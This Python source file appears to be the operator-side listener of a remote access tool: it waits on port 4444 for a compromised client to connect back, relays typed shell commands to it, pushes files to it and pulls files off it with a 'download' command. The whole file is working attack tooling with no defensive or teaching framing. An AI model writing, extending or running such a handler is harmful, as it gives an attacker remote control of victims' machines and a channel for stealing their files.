import socket 
from colorama import Fore, Style, init
import json
import base64
import os

# Initialize colorama
init(autoreset=True)

# Server configuration
HOST = "127.0.0.1"  # Replace with your server's IP address
PORT = 4444  # Replace with your desired port

# Print starting message
print(Fore.GREEN + "Starting TCP Handler...")

# Set up the server
server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
server.bind((HOST, PORT))
server.listen(5)

# Wait for a connection
print(Fore.YELLOW + f"Server listening on {Fore.CYAN}{HOST}:{PORT}")
client_socket, client_address = server.accept()
print(Fore.GREEN + f"Connection established with {client_address}")

def write_file(path, content):
    with open(path, "wb") as file:  # WB FOR WRITTABLE BINARY FILE
        file.write(base64.b64decode(content))
        return "[+] Download successful [+]"

def read_file(path):  # RB FOR READABLE BINARY FILE
    with open(path, "rb") as file:
        return base64.b64encode(file.read()).decode()  # Decode bytes to string

try:
    while True:
        # Receive the prompt from the client
        prompt = client_socket.recv(1024).decode("utf-8")
        print(Fore.CYAN + prompt, end="")

        # Get user input
        command = input()
        command_list = command.split(" ")

        # Handle upload command
        if command_list[0] == "upload":
            try:
                file_content = read_file(command_list[1])
                command_list.append(file_content)
                command = json.dumps(command_list)
            except Exception as e:
                print(Fore.RED + f"Error reading file: {e}")
                continue

        # Send the command to the client
        client_socket.sendall(command.encode("utf-8"))

        if command.lower() == "km":
            print(Fore.RED + "Disconnecting from client...")
            client_socket.close()
            break

        # Receive the output from the client
        output = client_socket.recv(4096).decode("utf-8")
        try:
            response = json.loads(output)
            if command_list[0] == "download" and len(command_list) > 1:
                response = write_file(command_list[1], response)
        except json.JSONDecodeError:
            response = output

        print(Fore.WHITE + response)

except KeyboardInterrupt:
    print(Fore.RED + "\nShutting down the server.")
    client_socket.close()
    server.close()
